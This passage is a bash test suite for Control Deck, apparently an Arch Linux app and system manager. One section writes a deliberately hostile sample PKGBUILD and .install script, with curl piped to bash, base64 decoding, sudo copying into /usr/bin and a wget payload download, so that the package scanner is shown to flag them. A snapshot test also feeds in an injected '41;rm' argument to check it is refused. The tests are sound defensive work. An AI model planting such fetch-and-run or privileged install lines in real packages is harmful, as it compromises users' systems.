#!/usr/bin/env bash
# Control Deck test suite.
#
# Runs the backend inside a throw-away $HOME with stubbed system tools
# (pacman, pkexec, flatpak, systemctl, curl, …): no root, no network, and
# nothing on the real system is touched.  Usage:  tests/run.sh
set -u

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CD="$ROOT/bin/control-deck"
T="$(mktemp -d)"
trap 'pkill -f -- "$T/fake/" 2>/dev/null; rm -rf "$T"' EXIT

export HOME="$T/home"
unset XDG_DATA_HOME XDG_CACHE_HOME XDG_CONFIG_HOME CONTROL_DECK_APPS_DIR INSTALL_ANY_APPS_DIR GITHUB_TOKEN
export LC_ALL=C.UTF-8
mkdir -p "$HOME" "$T/bin" "$T/dl" "$T/fake" "$T/sys"
A="$HOME/.local/share/applications"
APPS="$HOME/Applications"

# ---------------------------------------------------------------- stubs ----
stub() { printf '#!/usr/bin/env bash\n%s\n' "$2" > "$T/bin/$1"; chmod +x "$T/bin/$1"; }
stub pkexec 'echo "pkexec $*" >> "'"$T"'/pkexec.log"; exit 1'
stub notify-send 'echo "notify-send $*" >> "'"$T"'/notify.log"'
stub update-desktop-database 'exit 0'
stub curl 'out="" q="" prev=""; for a in "$@"; do
    case "$prev" in -o) out="$a" ;; --data-urlencode) q="${a#*=}" ;; esac
    case "$a" in file://*|http://*|https://*) url="$a" ;; esac; prev="$a"; done
[[ -z "${url:-}" ]] && for a in "$@"; do url="$a"; done
# -G --data-urlencode query=X on file:// → <path>q_<X>.json
[[ -n "$q" && "$url" == file://* ]] && url="${url}q_${q// /_}.json"
url="${url%%#*}"; [[ "$url" == file://*/ ]] && url="${url}index.html"
[[ -n "$out" ]] && exec > "$out"
case "$url" in
    file://*)    cat "${url#file://}" ;;
    */compare/*) [[ -n "${FAKE_COMPARE:-}" ]] && cat "$FAKE_COMPARE" || exit 22 ;;
    *)           exit 7 ;;
esac'
stub yay 'exit 0'
stub paru 'exit 0'
stub gio 'exit 0'
stub snapper 'echo "snapper $*" >> "'"$T"'/snapper.log"
case "$*" in
    *"--jsonout list"*) [[ -n "${FAKE_SNAPLIST:-}" ]] && cat "$FAKE_SNAPLIST" ;;
esac'
stub gtk-update-icon-cache 'exit 0'
stub steam 'echo "steam $*" >> "'"$T"'/steam.log"'
stub mangohud 'exec "$@"'
stub umbral 'echo "umbral $*" >> "'"$T"'/umbral.log"'
stub pgrep '[[ -n "${FAKE_FOSSILIZE:-}" && "$*" == *fossilize* ]] && exit 0; exit 1'
stub xdg-open 'exit 0'
stub checkupdates 'printf "%s" "${FAKE_UPDATES:-}"'
stub ldconfig '[[ "${FAKE_FUSE2:-1}" == 1 ]] && echo "	libfuse.so.2 (libc6,x86-64) => /usr/lib/libfuse.so.2"; exit 0'
stub pacman 'case "$1" in
    -Q)  [[ "$2" == snap-pac && "${FAKE_SNAPPAC:-1}" == 1 ]]; exit $? ;;
    -Fq) [[ "$2" == libgtk-3.so.0 ]] && echo extra/gtk3 ;;
    -Si) [[ "$2" == python-requests ]] && exit 0; exit 1 ;;
    -Qoq) exit 1 ;;
esac
exit 0'
stub flatpak 'case "$1" in
    info) [[ "$2" == --show-permissions ]] && cat "'"$T"'/fp-perms" ;;
    override) echo "flatpak $*" >> "'"$T"'/flatpak.log" ;;
esac
exit 0'
stub systemctl 'echo "systemctl $*" >> "'"$T"'/systemctl.log"
case "$*" in
    *"enable --now"*)  touch "'"$T"'/timer-on" ;;
    *"disable --now"*) rm -f "'"$T"'/timer-on" ;;
    *is-enabled*)      [[ -f "'"$T"'/timer-on" ]] ;;
    *is-active*)       exit 0 ;;
esac'
export PATH="$T/bin:$PATH"

# -------------------------------------------------------------- helpers ----
pass=0 failed=0
ok()  { pass=$((pass + 1)); printf '  \e[32m✔\e[0m %s\n' "$1"; }
bad() { failed=$((failed + 1)); printf '  \e[31m✘ %s\e[0m\n' "$1"; [[ -n "${2:-}" ]] && printf '      %s\n' "${2:0:400}"; }
eq()  { if [[ "$2" == "$3" ]]; then ok "$1"; else bad "$1" "expected «$3», got «$2»"; fi; }
has() { if [[ "$2" == *"$3"* ]]; then ok "$1"; else bad "$1" "«$3» not in: $2"; fi; }
hasnt() { if [[ "$2" != *"$3"* ]]; then ok "$1"; else bad "$1" "«$3» should not be in: $2"; fi; }
yes() { if eval "$2"; then ok "$1"; else bad "$1" "failed: $2"; fi; }
section() { printf '\n\e[1m%s\e[0m\n' "$1"; }
key() { awk -F= -v k="$2" '$1 == k { sub(/^[^=]*=/, ""); print; exit }' "$1"; }
# shellcheck source=bin/control-deck
fn() { ( source "$CD"; "$@" ); }   # call an internal function

# 1x1 PNG
PNG_B64='iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='

# fake AppImage: answers --appimage-extract like the real runtime does
# make_appimage <path> <name> [fuse2]
make_appimage() {
    cat > "$1" <<EOF
#!/usr/bin/env bash
# fake AppImage runtime for tests ${3:+(dlopen libfuse.so.2)}
if [[ "\$1" == --appimage-extract ]]; then
    r=squashfs-root; mkdir -p "\$r/usr/share/icons/hicolor/256x256/apps" "\$r/usr/share/applications"
    printf '[Desktop Entry]\nType=Application\nName=$2\nExec=AppRun --no-sandbox %%U\nIcon=fakeapp\nCategories=Development;\nStartupWMClass=FakeApp\n' \
        > "\$r/usr/share/applications/fakeapp.desktop"
    ln -sf usr/share/applications/fakeapp.desktop "\$r/fakeapp.desktop"
    echo '$PNG_B64' | base64 -d > "\$r/usr/share/icons/hicolor/256x256/apps/fakeapp.png"
    exit 0
fi
exec sleep 30
EOF
    chmod +x "$1"
}

desktop() {   # desktop <file> <name> <exec>
    mkdir -p "$(dirname "$1")"
    printf '[Desktop Entry]\nType=Application\nName=%s\nExec=%s\n' "$2" "$3" > "$1"
}

# ==========================================================================
section "CLI"
"$CD" help >/dev/null; eq "help exits 0" "$?" 0
"$CD" nope >/dev/null 2>&1; eq "unknown command exits 2" "$?" 2

section "Format detection & names"
eq "AppImage"          "$("$CD" detect x.AppImage | key /dev/stdin TYPE)" appimage
eq "pacman package"    "$("$CD" detect x-1-1-x86_64.pkg.tar.zst | key /dev/stdin TYPE)" pacman
eq "tarball"           "$("$CD" detect x.tar.gz | key /dev/stdin TYPE)" tar
eq ".deb without debtap is not supported" "$("$CD" detect x.deb | key /dev/stdin SUPPORTED)" no
eq "clean name: version+arch" "$(fn clean_base_name Obsidian-1.6.7-x86_64)" Obsidian
eq "clean name: latest-linux" "$(fn clean_base_name curseforge-latest-linux)" curseforge
eq "slugify" "$(fn slugify 'My Cool App!')" my-cool-app

# ==========================================================================
section "AppImage install (embedded metadata)"
make_appimage "$T/dl/FakeApp-1.2.3-x86_64.AppImage" "Fake App"
"$CD" install "$T/dl/FakeApp-1.2.3-x86_64.AppImage" > "$T/out" 2>&1; eq "install exits 0" "$?" 0
L="$A/appimage-fake-app.desktop"
yes "launcher created with a stable name" "[[ -f '$L' ]]"
yes "AppImage stored as ~/Applications/fake-app.AppImage" "[[ -x '$APPS/fake-app.AppImage' ]]"
eq "real name from embedded .desktop" "$(key "$L" Name)" "Fake App"
eq "embedded arguments kept" "$(key "$L" Exec)" "\"$APPS/fake-app.AppImage\" --no-sandbox %U"
eq "categories"  "$(key "$L" Categories)" "Development;"
eq "WM class"    "$(key "$L" StartupWMClass)" FakeApp
yes "icon extracted (via symlinked .desktop + hicolor)" "[[ -f '$(key "$L" Icon)' ]]"
yes "source file copied, not moved" "[[ -f '$T/dl/FakeApp-1.2.3-x86_64.AppImage' ]]"

section "Edit + reinstall keeps user changes"
cp "$L" "$T/localized.desktop"
printf 'Name[es]=Aplicación\n' >> "$L"
"$CD" edit "$L" NAME="Renamed" CATEGORIES="Game" NODISPLAY=true \
      EXEC="\"$APPS/fake-app.AppImage\" --no-sandbox --ozone-platform=wayland %U" >/dev/null
eq "name changed" "$(key "$L" Name)" Renamed
hasnt "localized Name[es] dropped" "$(cat "$L")" "Name[es]"
eq "categories get a trailing ;" "$(key "$L" Categories)" "Game;"
eq "hidden (NoDisplay)" "$(key "$L" NoDisplay)" true
yes "hidden app still listed (to unhide it)" "\"$CD\" list | jq -e 'any(.[]; .path == \"$L\" and .hidden)' >/dev/null"
make_appimage "$T/dl/FakeApp-2.0.0-x86_64.AppImage" "Fake App"
"$CD" install "$T/dl/FakeApp-2.0.0-x86_64.AppImage" >/dev/null 2>&1
eq "reinstall keeps the new name" "$(key "$L" Name)" Renamed
has "reinstall keeps edited Exec flags" "$(key "$L" Exec)" "--ozone-platform=wayland"
eq "reinstall keeps NoDisplay" "$(key "$L" NoDisplay)" true
"$CD" edit "$L" NODISPLAY=false >/dev/null
eq "unhide removes NoDisplay" "$(key "$L" NoDisplay)" ""

section "List · appinfo · sizes"
LIST="$("$CD" list)"
yes "list is valid JSON" "jq -e 'type == \"array\"' <<<'$LIST' >/dev/null"
eq "AppImage listed with its source" "$(jq -r --arg p "$L" '.[] | select(.path == $p) | .source' <<<"$LIST")" appimage
INFO="$("$CD" appinfo "$L")"
has "appinfo source" "$INFO" "SOURCE=appimage"
has "appinfo autostart off by default" "$INFO" "AUTOSTART=false"
SZ="$("$CD" sizes)"
yes "sizes reports the AppImage size" "jq -e --arg p '$L' '.[\$p].app > 0' <<<'$SZ' >/dev/null"

section "Autostart (opt-in)"
"$CD" autostart "$L" on >/dev/null
AS="$HOME/.config/autostart/appimage-fake-app.desktop"
yes "autostart entry created" "[[ -f '$AS' ]]"
eq "marked as ours" "$(key "$AS" X-ControlDeck-Autostart)" true
eq "status on" "$("$CD" autostart "$L" status)" on
"$CD" autostart "$L" off >/dev/null
yes "our entry removed on off" "[[ ! -f '$AS' ]]"
desktop "$T/sys/selfstart.desktop" "Self Start" "/usr/bin/true"
desktop "$HOME/.config/autostart/selfstart.desktop" "Self Start" "/usr/bin/true"
"$CD" autostart "$T/sys/selfstart.desktop" off >/dev/null
eq "an app's own entry is disabled with Hidden=true" "$(key "$HOME/.config/autostart/selfstart.desktop" Hidden)" true
"$CD" autostart "$T/sys/selfstart.desktop" on >/dev/null
eq "…and re-enabled" "$(key "$HOME/.config/autostart/selfstart.desktop" Hidden)" ""

section "Leftovers + purge uninstall"
mkdir -p "$HOME/.config/FakeApp" "$HOME/.config/keepme" "$HOME/.cache/renamed" "$HOME/.config/hypr"
LO="$("$CD" leftovers "$L")"
has "config dir found by WM class" "$LO" ".config/FakeApp"
has "cache dir found by (edited) name" "$LO" ".cache/renamed"
hasnt "unrelated dir not proposed" "$LO" "keepme"
"$CD" autostart "$L" on >/dev/null
IMG="$(key "$L" X-ControlDeck-File)"; ICON="$(key "$L" Icon)"
"$CD" uninstall "$L" --purge >/dev/null 2>&1; eq "uninstall exits 0" "$?" 0
yes "AppImage deleted" "[[ ! -e '$IMG' ]]"
yes "icon deleted" "[[ ! -e '$ICON' ]]"
yes "launcher deleted" "[[ ! -e '$L' ]]"
yes "its autostart entry deleted" "[[ ! -e '$AS' ]]"
yes "data dirs purged" "[[ ! -e '$HOME/.config/FakeApp' && ! -e '$HOME/.cache/renamed' ]]"
yes "unrelated dirs untouched" "[[ -d '$HOME/.config/keepme' && -d '$HOME/.config/hypr' ]]"

section "Legacy install-any launcher migration"
make_appimage "$APPS/fakeapp-latest-linux.AppImage" "Fake App"
desktop "$A/fakeapp-latest-linux.desktop" "Fake App" "\"$APPS/fakeapp-latest-linux.AppImage\" %U"
echo "X-Created-By=install-any" >> "$A/fakeapp-latest-linux.desktop"
eq "legacy launcher seen as appimage" "$("$CD" list | jq -r '.[] | select(.name == "Fake App") | .source')" appimage
"$CD" install "$APPS/fakeapp-latest-linux.AppImage" >/dev/null 2>&1
yes "legacy launcher removed" "[[ ! -e '$A/fakeapp-latest-linux.desktop' ]]"
yes "file moved to the stable name" "[[ ! -e '$APPS/fakeapp-latest-linux.AppImage' && -f '$APPS/fake-app.AppImage' ]]"
"$CD" uninstall "$A/appimage-fake-app.desktop" >/dev/null 2>&1

section "Tarball with launcher"
mkdir -p "$T/tar/MyTool-2.3.1-linux-x86_64/bin" "$T/tar/MyTool-2.3.1-linux-x86_64/share"
printf '#!/bin/sh\nexit 0\n' > "$T/tar/MyTool-2.3.1-linux-x86_64/bin/mytool"
printf '#!/bin/sh\nexit 0\n' > "$T/tar/MyTool-2.3.1-linux-x86_64/bin/mytool-updater"
chmod +x "$T/tar/MyTool-2.3.1-linux-x86_64/bin/"*
echo "$PNG_B64" | base64 -d > "$T/tar/MyTool-2.3.1-linux-x86_64/share/mytool.png"
(cd "$T/tar" && tar czf "$T/dl/MyTool-2.3.1-linux-x86_64.tar.gz" MyTool-2.3.1-linux-x86_64)
"$CD" install "$T/dl/MyTool-2.3.1-linux-x86_64.tar.gz" >/dev/null 2>&1; eq "tar install exits 0" "$?" 0
TL="$A/tar-mytool.desktop"
eq "launcher points at the main executable" "$(key "$TL" Exec)" "\"$APPS/mytool/bin/mytool\""
yes "tar icon found" "[[ -f '$(key "$TL" Icon)' ]]"
"$CD" uninstall "$TL" >/dev/null 2>&1
yes "tar uninstall removes its folder" "[[ ! -e '$APPS/mytool' && ! -e '$TL' ]]"

# ==========================================================================
section "Launch diagnostics"
fake() { printf '#!/bin/sh\n%s\n' "$2" > "$T/fake/$1"; chmod +x "$T/fake/$1"; desktop "$A/$1.desktop" "$1" "\"$T/fake/$1\" %U"; }
fake lib 'echo "./app: error while loading shared libraries: libgtk-3.so.0: cannot open shared object file" >&2; exit 127'
fake fuse 'echo "dlopen(): error loading libfuse.so.2" >&2; exit 1'
fake sbx 'echo "[1:FATAL:zygote_host_impl_linux.cc] No usable sandbox!" >&2; exit 133'
fake qt 'echo "qt.qpa.plugin: Could not find the Qt platform plugin \"wayland\"" >&2; exit 1'
fake py 'echo "ModuleNotFoundError: No module named '"'"'requests'"'"'" >&2; exit 1'
fake good 'exec sleep 30'
desktop "$A/gone.desktop" gone "/opt/nothing/here %U"

out() { "$CD" launch "$A/$1.desktop" 2>&1; }
O="$(out lib)";  has "missing library → package"   "$O" "FIX=repo:gtk3|"
O="$(out fuse)"; has "FUSE 2 → install fuse2"      "$O" "FIX=repo:fuse2|"
has              "FUSE 2 → run without FUSE"       "$O" "FIX=extractrun|"
O="$(out sbx)";  has "sandbox → --no-sandbox"      "$O" "FIX=nosandbox|"
O="$(out qt)";   has "Qt wayland plugin"           "$O" "FIX=repo:qt6-wayland|"
O="$(out py)";   has "python module → package"     "$O" "FIX=repo:python-requests|"
O="$(out gone)"; has "broken launcher explained"   "$O" "ISSUE=The program doesn't exist"
O="$(out good)"; has "healthy app just launches"   "$O" "▶ Launched: good"
pkill -f -- "$T/fake/good" 2>/dev/null

section "Fixes"
"$CD" fix "$A/sbx.desktop" nosandbox >/dev/null
eq "--no-sandbox inserted after the program" "$(key "$A/sbx.desktop" Exec)" "\"$T/fake/sbx\" --no-sandbox %U"
desktop "$A/envapp.desktop" envapp "env FOO=1 $T/fake/good %U"
"$CD" fix "$A/envapp.desktop" nosandbox >/dev/null
eq "--no-sandbox with an env prefix" "$(key "$A/envapp.desktop" Exec)" "env FOO=1 $T/fake/good --no-sandbox %U"
"$CD" fix "$A/fuse.desktop" extractrun >/dev/null
has "extract-and-run prefix" "$(key "$A/fuse.desktop" Exec)" "env APPIMAGE_EXTRACT_AND_RUN=1 "
FAKE_SNAPPAC=1 "$CD" fix "$A/lib.desktop" repo:gtk3 >/dev/null 2>&1; eq "repo fix fails when pkexec is cancelled" "$?" 4
has "repo fix goes through pkexec" "$(cat "$T/pkexec.log")" "pacman -S --needed --noconfirm -- gtk3"

section "FUSE 2 detection without running the app"
make_appimage "$T/dl/Old-1.0.AppImage" "Old Runtime" fuse2
FAKE_FUSE2=0 "$CD" install "$T/dl/Old-1.0.AppImage" > "$T/out" 2>&1
has "install warns about FUSE 2" "$(cat "$T/out")" "needs FUSE 2"
OL="$A/appimage-old-runtime.desktop"
has "appinfo flags it"         "$(FAKE_FUSE2=0 "$CD" appinfo "$OL")" "FIX=repo:fuse2|"
hasnt "no flag when fuse2 is installed" "$(FAKE_FUSE2=1 "$CD" appinfo "$OL")" "ISSUE="
FAKE_FUSE2=0 "$CD" launch "$OL" >/dev/null 2>&1; eq "launch refuses and explains" "$?" 4
"$CD" fix "$OL" extractrun >/dev/null
hasnt "extract-and-run silences the warning" "$(FAKE_FUSE2=0 "$CD" appinfo "$OL")" "ISSUE="
make_appimage "$T/dl/Old-1.1.AppImage" "Old Runtime" fuse2
"$CD" install "$T/dl/Old-1.1.AppImage" >/dev/null 2>&1
has "extract-and-run survives an update" "$(key "$OL" Exec)" "APPIMAGE_EXTRACT_AND_RUN=1"

# ==========================================================================
section "Flatpak permissions"
cat > "$T/fp-perms" <<'EOF'
[Context]
shared=ipc;network;
sockets=fallback-x11;pulseaudio;wayland;
devices=all;
filesystems=xdg-download;xdg-pictures:ro;~/.steam;

[Environment]
GTK_THEME=Adwaita
EOF
P="$("$CD" fpperms dev.test.App)"
g() { jq -r --arg k "$1" '.[] | select(.key == $k) | .granted' <<<"$P"; }
eq "network granted"        "$(g network)" true
eq "fallback-x11 counts as X11" "$(g x11)" true
eq "audio granted"          "$(g audio)" true
eq "downloads granted"      "$(g downloads)" true
eq "home not granted"       "$(g home)" false
eq "bluetooth not granted"  "$(g bluetooth)" false
"$CD" fpset dev.test.App home on >/dev/null
has "grant home → --filesystem=home" "$(cat "$T/flatpak.log")" "override --user --filesystem=home dev.test.App"
"$CD" fpset dev.test.App x11 off >/dev/null
has "revoke X11 drops both sockets" "$(cat "$T/flatpak.log")" "--nosocket=x11 --nosocket=fallback-x11 dev.test.App"
"$CD" fpset dev.test.App teleport on >/dev/null 2>&1; eq "unknown permission → exit 2" "$?" 2

# ==========================================================================
section "AUR PKGBUILD review"
cat > "$T/evil.PKGBUILD" <<'EOF'
pkgname=totally-legit
source=("http://example.com/app.tar.gz")
sha256sums=('SKIP')
build() {
    curl -s https://example.com/setup.sh | bash
    echo aGVsbG8= | base64 -d > x
    sudo cp x /usr/bin/
    # curl https://commented.out | sh   (comments are ignored)
}
EOF
cat > "$T/evil.install" <<'EOF'
post_install() { wget -q https://example.com/payload -O /tmp/p; }
EOF
S="$("$CD" aurscan "$T/evil.PKGBUILD" "$T/evil.install")"
lv() { jq -r --arg t "$1" '[.[] | select(.text | contains($t)) | .level] | first // "none"' <<<"$S"; }
eq "curl | bash is high"            "$(lv 'pipes it straight into a shell')" high
eq "base64 decoding is high"        "$(lv 'base64')" high
eq "sudo in the build is high"      "$(lv 'sudo')" high
eq "plain HTTP source is medium"    "$(lv 'plain HTTP')" medium
eq "SKIP for a non-VCS source"      "$(lv 'SKIP')" medium
eq ".install downloading is high"   "$(lv '.install script')" high
eq "comments are ignored" "$(jq '[.[] | select(.where == "PKGBUILD:8")] | length' <<<"$S")" 0
cat > "$T/good.PKGBUILD" <<'EOF'
pkgname=yay-bin
source_x86_64=("https://github.com/Jguer/yay/releases/download/v13.0.1/yay_13.0.1_x86_64.tar.gz")
sha256sums_x86_64=('1fdfcb5f7f387bc858d3a5754bdf4e4575bfbddac9560535a716d0ed7189c057')
package() { install -Dm755 yay "$pkgdir/usr/bin/yay"; }
EOF
eq "a clean PKGBUILD has no findings" "$("$CD" aurscan "$T/good.PKGBUILD")" "[]"
cat > "$T/git.PKGBUILD" <<'EOF'
source=("git+https://github.com/foo/bar.git")
sha256sums=('SKIP')
EOF
eq "SKIP is fine for a git source" "$("$CD" aurscan "$T/git.PKGBUILD")" "[]"

# ==========================================================================
section "Background update check (timer)"
eq "timer off by default" "$("$CD" timer status)" off
"$CD" timer on 4 >/dev/null
U="$HOME/.config/systemd/user"
has "service runs notify-updates" "$(cat "$U/control-deck-updates.service")" "control-deck notify-updates"
has "timer interval" "$(cat "$U/control-deck-updates.timer")" "OnUnitActiveSec=4h"
eq "timer status on" "$("$CD" timer status)" on
"$CD" timer on nope >/dev/null 2>&1; eq "bad interval → exit 2" "$?" 2
"$CD" timer off >/dev/null
yes "timer units removed" "[[ ! -e '$U/control-deck-updates.timer' ]]"
eq "timer status off" "$("$CD" timer status)" off
rm -f "$T/notify.log"
FAKE_UPDATES=$'foo 1-1 -> 1-2\n' "$CD" notify-updates
FAKE_UPDATES=$'foo 1-1 -> 1-2\n' "$CD" notify-updates
eq "notifies once per set of updates" "$(grep -c 'update(s) available' "$T/notify.log")" 1
FAKE_UPDATES=$'foo 1-1 -> 1-3\n' "$CD" notify-updates
eq "notifies again when it changes" "$(grep -c 'update(s) available' "$T/notify.log")" 2

# ==========================================================================
section "Clean-up"
desktop "$A/broken.desktop" "Broken" "/opt/removed/app"
C="$("$CD" cleanscan)"
# gone.desktop (from the diagnostics section) is broken too
eq "broken launchers detected" "$(jq -r '.[] | select(.id == "broken") | .count' <<<"$C")" 2
has "…listed by name" "$(jq -r '.[] | select(.id == "broken") | .details' <<<"$C")" "Broken"
"$CD" clean broken >/dev/null
yes "broken launcher moved to the trash" "[[ ! -e '$A/broken.desktop' ]] && ls '$HOME/.local/share/control-deck/trash/'*/broken.desktop >/dev/null"

section "Backup: export / restore"
desktop "$T/sys/term.desktop" "Terminal" "/usr/bin/true"
echo "$PNG_B64" | base64 -d > "$T/icon.png"
"$CD" edit "$T/sys/term.desktop" NAME="My Terminal" ICON="$T/icon.png" >/dev/null 2>&1
yes "system entry edited as a user copy" "[[ -f '$A/term.desktop' && '$(key "$T/sys/term.desktop" Name)' == Terminal ]]"
"$CD" export "$T/backup.json" >/dev/null
yes "export has the edited launcher" "jq -e 'any(.launchers[]; .file == \"term.desktop\" and .icon != null)' '$T/backup.json' >/dev/null"
rm -f "$A/term.desktop" "$HOME/.local/share/icons/control-deck-term.png"
"$CD" restore "$T/backup.json" >/dev/null 2>&1
eq "restore brings the launcher back" "$(key "$A/term.desktop" Name)" "My Terminal"
yes "…with its icon" "[[ -f '$(key "$A/term.desktop" Icon)' ]]"
echo '{}' > "$T/not-a-backup.json"
"$CD" restore "$T/not-a-backup.json" >/dev/null 2>&1; eq "rejects foreign files" "$?" 3

section "History"
H="$("$CD" history)"
yes "history is newest first" "[[ \$(jq -r '.[0].action' <<<'$H') == restore ]]"
yes "history recorded installs and uninstalls" "jq -e 'any(.[]; .action == \"install\") and any(.[]; .action == \"uninstall purge\")' <<<'$H' >/dev/null"


# ==========================================================================
section "Arch news"
cat > "$T/news.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>Arch Linux: Recent news updates</title>
<item><title>Foo &gt;= 2.0 requires manual intervention</title><link>https://archlinux.org/news/foo/</link><description>&lt;p&gt;Run &lt;code&gt;pacman -Syu foo&lt;/code&gt; before
the upgrade.&lt;/p&gt;</description><pubDate>Tue, 22 Sep 2026 09:09:27 +0000</pubDate></item>
<item><title>Old news</title><link>https://archlinux.org/news/old/</link><description>&lt;p&gt;Nothing to do.&lt;/p&gt;</description><pubDate>Mon, 01 Jun 2026 10:00:00 +0000</pubDate></item>
</channel></rss>
EOF
echo '[2026-08-01T10:00:00+0200] [PACMAN] starting full system upgrade' > "$T/pacman.log"
N="$(CONTROL_DECK_NEWS_URL="file://$T/news.xml" CONTROL_DECK_PACMAN_LOG="$T/pacman.log" "$CD" news)"
eq "two news items" "$(jq length <<<"$N")" 2
eq "entities decoded" "$(jq -r '.[0].title' <<<"$N")" "Foo >= 2.0 requires manual intervention"
eq "summary is plain text" "$(jq -r '.[0].summary' <<<"$N")" "Run pacman -Syu foo before the upgrade."
eq "news after the last upgrade is unread" "$(jq -r '.[0].unread' <<<"$N")" true
eq "older news is read" "$(jq -r '.[1].unread' <<<"$N")" false

section "Version & self-update"
PATH="$T/bin:$PATH" "$ROOT/install.sh" --no-deps >/dev/null 2>&1; eq "install.sh works in a clean HOME" "$?" 0
HEAD_SHA="$(git -C "$ROOT" rev-parse HEAD 2>/dev/null)"
yes "the test checkout is a readable git repo" "[[ -n '$HEAD_SHA' ]]"
eq "installed commit recorded" "$("$CD" version | key /dev/stdin COMMIT)" "$HEAD_SHA"
eq "source repo recorded" "$("$CD" version | key /dev/stdin SRC)" "$ROOT"
yes "GUI is installed last" "[[ \"$(grep -n 'shell.qml\" \"\$HOME' "$ROOT/install.sh" | cut -d: -f1)\" -gt \"$(grep -n 'install.env\"$' "$ROOT/install.sh" | cut -d: -f1)\" ]]"
printf '{"status":"ahead","ahead_by":2,"commits":[{"sha":"aaaaaaa111"},{"sha":"bbbbbbb222"}]}' > "$T/compare.json"
U="$(FAKE_COMPARE="$T/compare.json" "$CD" updates)"
eq "newer version on GitHub is offered" "$(jq -r '.[] | select(.source == "deck") | .new' <<<"$U")" "bbbbbbb (+2)"
printf '{"status":"identical","ahead_by":0,"commits":[]}' > "$T/compare.json"
eq "nothing offered when up to date" "$(FAKE_COMPARE="$T/compare.json" "$CD" updates | jq '[.[] | select(.source == "deck")] | length')" 0

section "Snapshots"
mkdir -p "$T/snapcfg"; echo 'ALLOW_USERS=""' > "$T/snapcfg/root"
export CONTROL_DECK_SNAPPER_DIR="$T/snapcfg"
ST="$(FAKE_SNAPPAC=1 "$CD" snapstatus)"
eq "snapper detected" "$(jq -r .snapper <<<"$ST")" true
eq "can't list without permission" "$(jq -r .canlist <<<"$ST")" false
eq "snap-pac detected" "$(jq -r .snappac <<<"$ST")" true
eq "snap-pac missing detected" "$(FAKE_SNAPPAC=0 "$CD" snapstatus | jq -r .snappac)" false
cat > "$T/snaplist.json" <<'EOF'
{"root":[{"number":0,"type":"single","date":"","description":"current","userdata":null},
 {"number":41,"type":"pre","date":"2026-09-26 11:41:30","description":"pacman -Syu","userdata":null},
 {"number":42,"type":"single","date":"2026-09-26 12:00:00","description":"Control Deck: before fun","userdata":{"important":"yes"}}]}
EOF
SL="$(FAKE_SNAPLIST="$T/snaplist.json" "$CD" snaplist)"
eq "snapshot 0 (current) is skipped" "$(jq length <<<"$SL")" 2
eq "newest first" "$(jq -r '.[0].num' <<<"$SL")" 42
eq "important flag" "$(jq -r '.[0].important' <<<"$SL")" true
"$CD" snaplist >/dev/null 2>&1; eq "no permission → exit 3" "$?" 3
rm -f "$T/pkexec.log"
FAKE_SNAPPAC=0 "$CD" fix "$A/lib.desktop" repo:gtk3 >/dev/null 2>&1
has "without snap-pac a snapshot is taken in the same pkexec call" "$(cat "$T/pkexec.log")" "snapper -c"
rm -f "$T/pkexec.log"
FAKE_SNAPPAC=1 "$CD" fix "$A/lib.desktop" repo:gtk3 >/dev/null 2>&1
hasnt "with snap-pac the deck doesn't duplicate it" "$(cat "$T/pkexec.log")" "snapper"
rm -f "$T/pkexec.log"
"$CD" snapdelete 41 42 30-35 >/dev/null 2>&1; eq "delete fails when pkexec is cancelled" "$?" 4
has "numbers and ranges go to one snapper delete" "$(cat "$T/pkexec.log")" "snapper -c root delete 41 42 30-35"
"$CD" snapdelete 0 >/dev/null 2>&1;     eq "snapshot 0 (live system) refused" "$?" 2
"$CD" snapdelete 9-3 >/dev/null 2>&1;   eq "backwards range refused" "$?" 2
"$CD" snapdelete '41;rm' >/dev/null 2>&1; eq "garbage refused" "$?" 2
"$CD" snapdelete >/dev/null 2>&1;       eq "nothing to delete → exit 2" "$?" 2
rm -f "$T/pkexec.log"
"$CD" snapcleanup >/dev/null 2>&1
has "cleanup runs snapper's algorithms in one pkexec call" "$(cat "$T/pkexec.log")" "empty-pre-post"
has "snaplimits reads the config" "$(printf 'NUMBER_LIMIT="50"\n' >> "$T/snapcfg/root"; "$CD" snaplimits)" "NUMBER_LIMIT=50"
unset CONTROL_DECK_SNAPPER_DIR

export CONTROL_DECK_PACMAN_DB="$T/pacdb" CONTROL_DECK_SNAPSHOTS_DIR="$T/snaps"
mkdir -p "$T/pacdb" "$T/snaps/7/snapshot$T/pacdb"
for p in foo-1.1-1 bar-2.0-1 newpkg-3-2 lib32-foo-bar-1.2-3; do mkdir "$T/pacdb/$p"; done
for p in foo-1.0-1 bar-2.0-1 gone-1-1 lib32-foo-bar-1.2-3; do mkdir "$T/snaps/7/snapshot$T/pacdb/$p"; done
D="$("$CD" snapdiff 7)"
has "changed package"  "$D" "~ foo  1.0-1 → 1.1-1"
has "removed package"  "$D" "- gone 1-1"
has "added package"    "$D" "+ newpkg 3-2"
hasnt "unchanged package (dashes in the name) not listed" "$D" "lib32-foo-bar"
has "summary" "$D" "Total: 1 added, 1 removed, 1 changed."
"$CD" snapdiff nope >/dev/null 2>&1; eq "bad snapshot number → exit 2" "$?" 2
unset CONTROL_DECK_PACMAN_DB CONTROL_DECK_SNAPSHOTS_DIR

# ==========================================================================
section "Gaming: Steam library"
ST="$T/steam"; export CONTROL_DECK_STEAM_ROOT="$ST" CONTROL_DECK_STEAM_RUNNING=0
mkdir -p "$ST/steamapps/compatdata/100" "$ST/steamapps/common/Proton - Experimental" \
         "$ST/userdata/42/config" "$ST/config" "$ST/compatibilitytools.d/GE-Proton9-1"
printf '"libraryfolders"\n{\n\t"0"\n\t{\n\t\t"path"\t\t"%s"\n\t}\n}\n' "$ST" > "$ST/steamapps/libraryfolders.vdf"
man() { printf '"AppState"\n{\n\t"appid"\t\t"%s"\n\t"name"\t\t"%s"\n\t"installdir"\t\t"%s"\n\t"SizeOnDisk"\t\t"%s"\n}\n' "$1" "$2" "$3" "$4" > "$ST/steamapps/appmanifest_$1.acf"; }
man 100 "Game \"Quoted\" One" GameOne 1000
man 200 "Second Game" SecondGame 2000
man 1493710 "Proton Experimental" "Proton - Experimental" 5
cat > "$ST/userdata/42/config/localconfig.vdf" <<'EOF'
"UserLocalConfigStore"
{
	"Software"
	{
		"Valve"
		{
			"Steam"
			{
				"apps"
				{
					"100"
					{
						"LastPlayed"		"1790758987"
